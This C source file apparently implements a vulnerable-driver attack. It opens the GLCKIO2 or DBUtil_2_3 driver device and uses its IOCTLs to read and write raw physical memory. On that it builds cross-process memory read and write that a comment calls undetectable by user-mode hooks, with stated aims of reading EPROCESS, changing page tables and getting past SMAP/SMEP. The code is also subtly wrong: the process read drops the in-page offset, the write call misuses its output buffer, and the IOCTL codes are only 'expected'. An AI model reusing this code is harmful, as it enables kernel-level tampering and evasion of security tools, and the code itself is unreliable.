#include "driver_loader.h"
#include <psapi.h>

//
// GLCKIO2-style physical memory access interface.
//
// GLCKIO2.sys provides IOCTLs for direct physical memory read/write.
// Physical memory access from user-mode enables:
//   - Reading EPROCESS structures of any process
//   - Modifying page tables (PML4/PTE) directly
//   - Accessing memory protected by SMAP/SMEP
//
// IOCTL codes (ASUS GLCKIO2 convention):
//
#pragma pack(push, 1)

typedef struct _PHYSICAL_MEMORY_REQUEST {
    DWORD64 PhysicalAddress;  // Physical address to read/write
    DWORD   Size;             // Number of bytes
    DWORD   Reserved;
} PHYSICAL_MEMORY_REQUEST, *PPHYSICAL_MEMORY_REQUEST;

//
// Virtual-to-Physical address translation structure
//
typedef struct _VA2PA_REQUEST {
    DWORD64 VirtualAddress;   // Virtual address to translate
    DWORD   ProcessId;        // PID of owning process (0 = current)
    DWORD   Reserved;
} VA2PA_REQUEST, *PVA2PA_REQUEST;

typedef struct _VA2PA_RESPONSE {
    DWORD64 PhysicalAddress;  // Resulting physical address
    DWORD   PageFlags;        // Page table flags (present, writable, nx, etc.)
    DWORD   Reserved;
} VA2PA_RESPONSE, *PVA2PA_RESPONSE;

#pragma pack(pop)

//
// Expected IOCTL codes for GLCKIO2.sys
//
#define IOCTL_GLCKIO_READ_PHYSICAL  0x80102040
#define IOCTL_GLCKIO_WRITE_PHYSICAL 0x80102044
#define IOCTL_GLCKIO_VA2PA          0x80102048

static HANDLE g_MemDeviceHandle = INVALID_HANDLE_VALUE;

//
// Open the physical memory driver device.
// Tries GLCKIO2 first, falls back to common alternatives.
//
BOOL
MemInit(VOID)
{
    //
    // Try GLCKIO2
    //
    g_MemDeviceHandle = CreateFileA(
        "\\\\.\\GLCKIO2",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (g_MemDeviceHandle == INVALID_HANDLE_VALUE) {
        //
        // Fallback: try DBUtil_2_3
        //
        g_MemDeviceHandle = CreateFileA(
            "\\\\.\\DBUtil_2_3",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
    }

    return (g_MemDeviceHandle != INVALID_HANDLE_VALUE);
}

//
// Read physical memory at the specified address.
// Returns TRUE on success; Buffer receives the data.
//
BOOL
ReadPhysicalMemory(
    _In_ DWORD64 PhysicalAddress,
    _Out_writes_bytes_(Size) PVOID Buffer,
    _In_ DWORD Size
    )
{
    PHYSICAL_MEMORY_REQUEST request;
    DWORD                   bytesReturned = 0;
    BOOL                    result;

    if (Buffer == NULL || Size == 0 || Size > 0x10000) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (g_MemDeviceHandle == INVALID_HANDLE_VALUE) {
        SetLastError(ERROR_INVALID_HANDLE);
        return FALSE;
    }

    request.PhysicalAddress = PhysicalAddress;
    request.Size            = Size;
    request.Reserved        = 0;

    result = DeviceIoControl(
        g_MemDeviceHandle,
        IOCTL_GLCKIO_READ_PHYSICAL,
        &request,
        sizeof(request),
        Buffer,
        Size,
        &bytesReturned,
        NULL
    );

    return result;
}

//
// Write data to physical memory.
// WARNING: Writing to wrong physical addresses will BSOD.
//
BOOL
WritePhysicalMemory(
    _In_ DWORD64 PhysicalAddress,
    _In_reads_bytes_(Size) PVOID Buffer,
    _In_ DWORD Size
    )
{
    PHYSICAL_MEMORY_REQUEST request;
    DWORD                   bytesReturned = 0;
    BOOL                    result;
    DWORD                   outputSize;

    if (Buffer == NULL || Size == 0 || Size > 0x10000) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (g_MemDeviceHandle == INVALID_HANDLE_VALUE) {
        SetLastError(ERROR_INVALID_HANDLE);
        return FALSE;
    }

    request.PhysicalAddress = PhysicalAddress;
    request.Size            = Size;
    request.Reserved        = 0;

    //
    // Some drivers return status in output buffer
    //
    outputSize = sizeof(DWORD);

    result = DeviceIoControl(
        g_MemDeviceHandle,
        IOCTL_GLCKIO_WRITE_PHYSICAL,
        &request,
        sizeof(request),
        &bytesReturned,
        outputSize,
        &bytesReturned,
        NULL
    );

    return result;
}

//
// Translate a virtual address to physical address for a given process.
// ProcessId = 0 means current process.
// Returns TRUE on success; PhysicalAddress receives the translated address.
//
BOOL
VirtualToPhysical(
    _In_ DWORD64 VirtualAddress,
    _In_ DWORD ProcessId,
    _Out_ PDWORD64 PhysicalAddress
    )
{
    VA2PA_REQUEST  request;
    VA2PA_RESPONSE response;
    DWORD          bytesReturned = 0;
    BOOL           result;

    if (PhysicalAddress == NULL) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (g_MemDeviceHandle == INVALID_HANDLE_VALUE) {
        SetLastError(ERROR_INVALID_HANDLE);
        return FALSE;
    }

    request.VirtualAddress = VirtualAddress;
    request.ProcessId      = ProcessId;
    request.Reserved       = 0;

    result = DeviceIoControl(
        g_MemDeviceHandle,
        IOCTL_GLCKIO_VA2PA,
        &request,
        sizeof(request),
        &response,
        sizeof(response),
        &bytesReturned,
        NULL
    );

    if (result) {
        *PhysicalAddress = response.PhysicalAddress;
    }

    return result;
}

//
// Read bytes from another process's virtual address space by
// translating through physical memory (undetectable by user-mode hooks).
//
BOOL
ReadProcessPhysicalMemory(
    _In_ DWORD ProcessId,
    _In_ DWORD64 VirtualAddress,
    _Out_writes_bytes_(Size) PVOID Buffer,
    _In_ DWORD Size
    )
{
    DWORD64 physicalAddr;
    DWORD   offset;
    DWORD   toRead;
    DWORD   totalRead = 0;
    BOOL    result;
    PBYTE   buf = (PBYTE)Buffer;

    //
    // Read page by page to handle cross-page boundaries
    //
    while (totalRead < Size) {
        //
        // Translate the current virtual address
        //
        if (!VirtualToPhysical(VirtualAddress + totalRead, ProcessId,
                &physicalAddr))
        {
            return FALSE;
        }

        //
        // Calculate how many bytes we can read from this page
        //
        offset = (DWORD)(physicalAddr & 0xFFF);
        toRead = (DWORD)(0x1000 - offset);
        if (toRead > (Size - totalRead)) {
            toRead = (Size - totalRead);
        }

        //
        // Read from the aligned physical address
        //
        result = ReadPhysicalMemory(
            physicalAddr & ~0xFFF,
            buf + totalRead,
            toRead
        );

        if (!result) {
            return FALSE;
        }

        totalRead += toRead;
    }

    return TRUE;
}

//
// Write bytes to another process's virtual address space via physical memory.
//
BOOL
WriteProcessPhysicalMemory(
    _In_ DWORD ProcessId,
    _In_ DWORD64 VirtualAddress,
    _In_reads_bytes_(Size) PVOID Buffer,
    _In_ DWORD Size
    )
{
    DWORD64 physicalAddr;
    DWORD   offset;
    DWORD   toWrite;
    DWORD   totalWritten = 0;
    BOOL    result;
    PBYTE   buf = (PBYTE)Buffer;

    while (totalWritten < Size) {
        if (!VirtualToPhysical(VirtualAddress + totalWritten, ProcessId,
                &physicalAddr))
        {
            return FALSE;
        }

        offset = (DWORD)(physicalAddr & 0xFFF);
        toWrite = (DWORD)(0x1000 - offset);
        if (toWrite > (Size - totalWritten)) {
            toWrite = (Size - totalWritten);
        }

        //
        // Must read-modify-write to preserve rest of page
        //
        DWORD64 pageBase = physicalAddr & ~0xFFF;
        BYTE    pageBuffer[0x1000];

        if (!ReadPhysicalMemory(pageBase, pageBuffer, sizeof(pageBuffer))) {
            return FALSE;
        }

        CopyMemory(pageBuffer + offset, (PBYTE)buf + totalWritten, toWrite);

        result = WritePhysicalMemory(pageBase, pageBuffer, sizeof(pageBuffer));
        if (!result) {
            return FALSE;
        }

        totalWritten += toWrite;
    }

    return TRUE;
}

VOID
MemCleanup(VOID)
{
    if (g_MemDeviceHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_MemDeviceHandle);
        g_MemDeviceHandle = INVALID_HANDLE_VALUE;
    }
}
